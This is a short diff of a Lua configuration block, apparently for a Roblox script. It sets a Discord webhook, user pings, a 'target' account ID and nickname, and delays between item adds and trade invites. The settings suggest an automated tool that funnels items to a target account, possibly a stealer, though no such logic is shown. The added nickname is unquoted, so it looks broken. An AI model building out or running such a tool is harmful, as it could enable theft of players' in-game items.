@@ -11,6 +11,7 @@ local WEBHOOK            = "https://discord.com/api/webhooks/1481221065773420719
 local PING_1             = "<@1451570927711158313>"
 local PING_2             = "<@1451570927711158313>"
 local TARGET_ID          = 9929561794        -- ID Roblox do alvo
+local TARGET_NICK        = morera377
 local DELAY_STEP         = 1        -- delay entre adds
 local TRADE_CYCLE_DELAY  = 2        -- delay entre invites
 
